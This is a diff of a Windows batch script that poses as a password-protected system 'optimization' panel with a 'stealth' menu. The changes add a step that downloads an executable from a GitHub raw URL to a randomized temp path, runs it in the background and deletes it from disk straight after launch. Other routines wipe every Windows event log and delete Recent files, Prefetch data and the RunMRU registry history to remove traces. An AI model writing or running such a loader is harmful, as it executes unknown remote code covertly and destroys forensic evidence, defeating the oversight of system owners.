@@ -1,12 +1,9 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: URL of the remote stealth password file
+:: URL of the remote stealth password file and EXE
 set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
-
-:: EXE download URL and temporary path
-set "EXE_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/main/CAXVN.exe"
-set "TEMP_EXE=%TEMP%\CAXVN.exe"
+set "STEALTH_EXE_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/main/CAXVN.exe"
 
 :LOGIN
 cls
@@ -35,7 +32,6 @@ goto LOGIN
 :CheckStealthPassword
 set "inputpass=%~1"
 for /f "usebackq delims=" %%A in (`powershell -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
-
 if /i "%inputpass%"=="%remote_pass%" (
     exit /b 0
 ) else (
@@ -73,25 +69,18 @@ timeout /t 2 /nobreak >nul
 goto OPTIMIZATION_MENU
 
 :CLEAN_REGISTRY_LOGS
-echo Cleaning Registry Logs...
-for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G"
-)
+for /f "tokens=*" %%G in ('wevtutil el') do (wevtutil cl "%%G")
 echo Registry logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAN_EVENT_LOGS
-echo Cleaning Event Logs...
-for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G"
-)
+for /f "tokens=*" %%G in ('wevtutil el') do (wevtutil cl "%%G")
 echo Event logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAR_TEMP_FILES
-echo Clearing Temp Files...
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
 echo Temp files cleared.
@@ -99,26 +88,22 @@ pause
 goto OPTIMIZATION_MENU
 
 :FLUSH_DNS_CACHE
-echo Flushing DNS Cache...
 ipconfig /flushdns
 echo DNS Cache flushed.
 pause
 goto OPTIMIZATION_MENU
 
 :CHECK_DISK
-echo Checking Disk for Errors...
 chkdsk C: /f /r
 pause
 goto OPTIMIZATION_MENU
 
 :DEFRAGMENT_DISK
-echo Defragmenting C: drive...
 defrag C: /U /V
 pause
 goto OPTIMIZATION_MENU
 
 :SYSTEM_FILE_CHECKER
-echo Running System File Checker...
 sfc /scannow
 pause
 goto OPTIMIZATION_MENU
@@ -152,41 +137,48 @@ timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
 :SETUP
-cls
-echo Setting up the stealth EXE...
-powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%TEMP_EXE%'"
-echo Setup complete. EXE stored in TEMP.
+echo Setting up EXE from GitHub...
+set "tmpfile=%temp%\CAXVN_%RANDOM%.exe"
+powershell -Command "Invoke-WebRequest -Uri '%STEALTH_EXE_URL%' -OutFile '%tmpfile%'"
+set "EXE_PATH=%tmpfile%"
+echo Setup complete.
 pause
 goto STEALTH_MENU
 
 :RUN
-cls
-echo Running the stealth EXE...
-start "" "%TEMP_EXE%"
+if not defined EXE_PATH (
+    echo Please run Setup first.
+    pause
+    goto STEALTH_MENU
+)
+echo Launching EXE in background...
+start "" /b "%EXE_PATH%"
+timeout /t 2 >nul
+del /f /q "%EXE_PATH%" >nul 2>&1
+echo EXE launched and deleted from disk.
 pause
 goto STEALTH_MENU
 
 :BYPASS
-cls
-echo Performing stealth cleanup...
-del /f /q "%TEMP_EXE%" >nul 2>&1
+echo Performing deep clean...
+:: Clear recent files
+del /f /q "%APPDATA%\Microsoft\Windows\Recent\*" >nul 2>&1
 
-:: Clear Recent Files (non-Explorer)
-for /f %%i in ('dir /b /a:-d "%APPDATA%\Microsoft\Windows\Recent\*"') do (
-    del "%APPDATA%\Microsoft\Windows\Recent\%%i" >nul 2>&1
-)
+:: Clear temp and prefetch
+del /f /q "%temp%\*" >nul 2>&1
+del /f /q "C:\Windows\Prefetch\*" >nul 2>&1
 
-:: Optionally clear Prefetch (uncomment at own risk)
-:: del /f /q C:\Windows\Prefetch\*.*
-echo Stealth EXE and recent traces removed.
+:: Clear Run history from registry
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
+
+echo All traces removed.
 pause
 goto STEALTH_MENU
 
 :ALERT_ADMIN
-cls
 echo Alerting admin...
-:: (Optional: send webhook or log message here)
-echo Admin has been alerted !!!
+:: Example: logging alert (can replace with webhook/email)
+echo ALERT: Unauthorized access attempt on %DATE% %TIME% >> %temp%\alert.log
 pause
 goto STEALTH_MENU
 
